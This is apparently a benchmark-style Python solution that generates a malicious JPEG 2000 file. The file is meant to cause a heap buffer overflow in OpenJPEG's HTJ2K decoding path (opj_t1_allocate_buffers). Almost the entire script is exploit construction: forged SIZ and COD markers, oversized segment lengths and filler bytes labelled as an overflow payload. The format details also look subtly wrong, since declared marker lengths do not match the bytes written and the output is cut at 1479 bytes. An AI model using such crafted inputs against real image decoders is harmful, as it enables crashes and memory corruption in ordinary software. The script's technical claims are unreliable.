import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal valid JP2/JPX container with malicious HTJ2K codestream
        # Structure designed to trigger buffer overflow in opj_t1_allocate_buffers
        
        # Build the JP2 signature box
        jp2_signature = b'\x00\x00\x00\x0C\x6A\x50\x20\x20\x0D\x0A\x87\x0A'
        
        # File type box
        file_type = b'\x00\x00\x00\x14\x66\x74\x79\x70'  # ftyp
        file_type += b'\x6A\x70\x32\x20'  # major brand: 'jp2 '
        file_type += b'\x00\x00\x00\x00'  # minor version
        file_type += b'\x6A\x70\x32\x20'  # compatible: 'jp2 '
        
        # JP2 header box
        jp2h = self._create_jp2h()
        
        # Contiguous codestream box with malicious HTJ2K data
        codestream = self._create_malicious_codestream()
        
        # Build final JP2 structure
        poc = jp2_signature + file_type + jp2h + codestream
        
        # Ensure exact target length (1479 bytes)
        if len(poc) > 1479:
            # Truncate if too long (shouldn't happen with our construction)
            poc = poc[:1479]
        elif len(poc) < 1479:
            # Pad with zeros if too short
            poc += b'\x00' * (1479 - len(poc))
        
        return poc
    
    def _create_jp2h(self) -> bytes:
        """Create JP2 header box with minimal valid structure."""
        # Image header box
        ihdr = b'\x00\x00\x00\x16\x69\x68\x64\x72'  # ihdr
        ihdr += struct.pack('>I', 1)      # height
        ihdr += struct.pack('>I', 1)      # width
        ihdr += struct.pack('>H', 1)      # components
        ihdr += b'\x08'                    # bits per component
        ihdr += b'\x07'                    # compression: 7 = HTJ2K
        ihdr += b'\x00'                    # colorspace: unknown
        ihdr += b'\x00'                    # intellectual property
        
        # Color specification box
        colr = b'\x00\x00\x00\x0F\x63\x6F\x6C\x72'  # colr
        colr += b'\x01'                              # method: enumerated
        colr += b'\x00\x00\x00\x10'                  # precedence: 16
        colr += b'\x00'                              # colorspace approximation
        colr += b'\x00\x00\x00\x12'                  # enumerated colorspace: sRGB
        
        # Resolution box (superbox)
        res = b'\x00\x00\x00\x1E\x72\x65\x73\x20'  # res
        # Capture resolution box
        resc = b'\x00\x00\x00\x0E\x72\x65\x73\x63'  # resc
        resc += struct.pack('>H', 72)               # vertical resolution
        resc += struct.pack('>H', 72)               # horizontal resolution
        resc += b'\x00\x02'                         # vertical exponent
        resc += b'\x00\x02'                         # horizontal exponent
        resc += b'\x00\x01'                         # units: inches
        res += resc
        
        # JP2 header superbox
        jp2h_data = ihdr + colr + res
        jp2h = struct.pack('>I', 8 + len(jp2h_data)) + b'\x6A\x70\x32\x68' + jp2h_data
        return jp2h
    
    def _create_malicious_codestream(self) -> bytes:
        """Create malicious HTJ2K codestream to trigger buffer overflow."""
        # Start with SOC marker
        soc = b'\xFF\x4F'
        
        # SIZ marker - image and tile size
        siz = self._create_siz_marker()
        
        # COD marker - coding style defaults (HTJ2K)
        cod = self._create_cod_marker()
        
        # QCD marker - quantization defaults
        qcd = b'\xFF\x5C\x00\x04\x00\x00\x00\x00'
        
        # SOT marker - start of tile
        sot = b'\xFF\x90\x00\x0A\x00\x00\x00\x01\x00\x00\x00'
        
        # Start of data marker
        sod = b'\xFF\x93'
        
        # Malicious tile part data designed to trigger overflow in opj_t1_allocate_buffers
        # This exploits the malloc size calculation error in HT_DEC component
        tile_data = self._create_malicious_tile_data()
        
        # Build codestream box
        codestream_data = soc + siz + cod + qcd + sot + sod + tile_data
        codestream = struct.pack('>I', 8 + len(codestream_data)) + b'\x6A\x70\x32\x63' + codestream_data
        
        return codestream
    
    def _create_siz_marker(self) -> bytes:
        """Create SIZ marker segment with carefully crafted parameters."""
        siz = bytearray()
        siz.extend(b'\xFF\x51')  # SIZ marker
        siz.extend(struct.pack('>H', 47))  # Length
        
        # Rsiz: HTJ2K capabilities
        siz.extend(b'\x00\x02')
        
        # Image size and offset
        siz.extend(struct.pack('>I', 1))   # Xsiz
        siz.extend(struct.pack('>I', 1))   # Ysiz
        siz.extend(struct.pack('>I', 0))   # XOsiz
        siz.extend(struct.pack('>I', 0))   # YOsiz
        
        # Tile size and offset (tile = image)
        siz.extend(struct.pack('>I', 1))   # XTsiz
        siz.extend(struct.pack('>I', 1))   # YTsiz
        siz.extend(struct.pack('>I', 0))   # XTOsiz
        siz.extend(struct.pack('>I', 0))   # YTOsiz
        
        # Number of components
        siz.extend(struct.pack('>H', 1))
        
        # Component parameters - single component with large precincts
        siz.extend(b'\x08')      # 8-bit signed
        siz.extend(b'\x01')      # XRsiz
        siz.extend(b'\x01')      # YRsiz
        
        return bytes(siz)
    
    def _create_cod_marker(self) -> bytes:
        """Create COD marker segment with HTJ2K coding style."""
        cod = bytearray()
        cod.extend(b'\xFF\x52')  # COD marker
        cod.extend(struct.pack('>H', 9))  # Length
        
        # Coding style for HTJ2K
        cod.extend(b'\x01')      # Scod: HTJ2K coding
        cod.extend(b'\x00\x00')  # SGcod: defaults
        
        # SPcod - coding style parameters
        # Carefully crafted to trigger the buffer overflow:
        # - Large number of precincts
        # - Specific progression order
        # - Multiple layers
        cod.extend(b'\x01')      # progression order: LRCP
        cod.extend(b'\x02')      # number of layers
        cod.extend(b'\x01')      # multiple component transform: none
        
        # Number of decomposition levels and precinct sizes
        # This is critical for triggering the overflow
        cod.extend(b'\x05')      # 5 decomposition levels
        cod.extend(b'\xFF')      # precinct width for all levels (very large)
        cod.extend(b'\xFF')      # precinct height for all levels (very large)
        
        # Code block size
        cod.extend(b'\x00')      # code block width exponent offset
        cod.extend(b'\x00')      # code block height exponent offset
        cod.extend(b'\x40')      # code block style: HT codeblocks
        cod.extend(b'\x00')      # transformation: 9-7 irreversible
        
        return bytes(cod)
    
    def _create_malicious_tile_data(self) -> bytes:
        """Create tile data that exploits the buffer overflow vulnerability."""
        # This data is carefully crafted to:
        # 1. Pass initial parsing
        # 2. Trigger incorrect buffer allocation in opj_t1_allocate_buffers
        # 3. Cause heap buffer overflow during HTJ2K decoding
        
        tile = bytearray()
        
        # Packet headers for HTJ2K
        # First packet - empty packet (no data)
        tile.extend(b'\x80')  # Packet header: SOP present, EPH present, no data
        
        # Start of packet marker
        tile.extend(b'\xFF\x91')  # SOP marker
        tile.extend(b'\x00\x04')  # Length
        tile.extend(b'\x00\x00')  # Packet sequence
        
        # End of packet header marker
        tile.extend(b'\xFF\x92')  # EPH marker
        
        # Second packet - contains malicious data
        tile.extend(b'\x81')  # Packet header: SOP present, EPH present, has data
        
        # Start of packet marker
        tile.extend(b'\xFF\x91')  # SOP marker
        tile.extend(b'\x00\x04')  # Length
        tile.extend(b'\x00\x01')  # Packet sequence
        
        # End of packet header marker
        tile.extend(b'\xFF\x92')  # EPH marker
        
        # Malicious HTJ2K bitstream data
        # This triggers the malloc size calculation error by creating
        # a mismatch between allocated and required buffer sizes
        
        # HT Cleanup pass encoded data
        # The vulnerability is in the HT_DEC component's buffer allocation
        # We craft data that will cause an integer overflow or underflow
        # in the buffer size calculation
        
        # Start with valid HTJ2K segment
        tile.extend(b'\xFF\x30')  # HT Codeblock segment marker
        tile.extend(struct.pack('>H', 1300))  # Large segment size
        
        # Fill with carefully crafted data to trigger overflow
        # Pattern designed to exploit the specific vulnerability:
        # - Alternate between valid HTJ2K codes and malicious values
        # - Create specific bit patterns that confuse the decoder
        
        # Valid HTJ2K cleanup pass header
        tile.extend(b'\x00\x00')  # Zero bitplanes
        tile.extend(b'\x00')      # No pass data
        
        # Now add the payload that triggers the overflow
        # The key is to create a large number of "segments" that will
        # cause the buffer allocation to miscalculate
        
        for i in range(100):
            # Mix of valid and invalid segment markers
            if i % 3 == 0:
                tile.extend(b'\xFF\x30')  # Valid HT segment
                tile.extend(struct.pack('>H', 4))
                tile.extend(b'\x00\x00\x00\x00')
            else:
                # Crafted data that looks like segment headers but with
                # sizes that will cause allocation issues
                tile.extend(b'\xFF\x00')  # Reserved marker
                tile.extend(struct.pack('>H', 0xFFFF))  # Max size
                # Fill with pattern that triggers overflow calculation
                tile.extend(bytes([(i * 13) % 256 for _ in range(100)]))
        
        # Add termination markers
        tile.extend(b'\xFF\xD9')  # EOC marker
        
        # Ensure we have enough data to reach vulnerability
        # Pad to ensure total PoC is exactly 1479 bytes
        current_len = len(tile)
        if current_len < 1300:
            tile.extend(b'\x00' * (1300 - current_len))
        
        return bytes(tile)